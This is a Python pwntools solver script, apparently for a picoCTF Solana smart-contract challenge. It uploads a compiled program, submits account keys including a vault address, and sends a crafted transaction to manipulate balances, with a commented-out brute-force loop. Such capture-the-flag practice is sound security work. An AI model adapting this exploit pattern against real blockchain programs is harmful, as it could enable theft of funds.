from pwn import *
from solana.publickey import PublicKey
import time

import base64

a = open("./out.so", "rb").read()
context.log_level="debug"

p = remote("localhost", 8080)
#p = remote("saturn.picoctf.net", 56015)

p.sendlineafter(b"len:", str(len(a)))

p.send(a)


p.recvuntil(b"solve pubkey: ")

solve_pubkey = PublicKey((p.recvline()[:-1]).decode())

print("solve pubkey", solve_pubkey)

p.recvuntil(b"user pubkey: ")

user_pubkey = p.recvline()[:-1]

print("user pubkey", user_pubkey)

beachside_pubkey = PublicKey("4C2awdrFxULCkG7uLh1xz1qhgXAadm2rxmu2TT5zXty9")

accounts = [
    [b"_", b"SysvarC1ock11111111111111111111111111111111"],
    [b"_", b"11111111111111111111111111111111"],
    [b"w", b"CXDX7A8ecYZ5Gmt1jDnXb6VEVohoXjD5f8s98tDrCxip"], # Program pubkey
    [b"sw", user_pubkey],
    [b"w", b"618EFqN2MmRJFxwYeyADjMSCFZQ6Hax7PbdMevy4nc8B"], # Vault pubkey
    [b"w", b"6fuxPWSXNRMiWVNsZFFNsrXcscm6pWhP49ZFx4YhtwTE"], # Program pubkey
    [b"_", beachside_pubkey.to_base58()], # Has to be here for the invoke.
]

p.sendline(str(len(accounts)))

for a in accounts:
    p.sendline(b' '.join(a))

transaction = p32(0) + p32(0)

p.sendline(str(len(transaction)))

p.send(transaction)

# p.recvuntil('user bal: ')
# user_bal = int(p.recvline())

# p.close()

    # return user_bal != 10

# i = 0
# while True:
#     print(i)
#     if(test_one(i, 8)):
#         print("FOUND")
#         break
#     i += 1

p.interactive()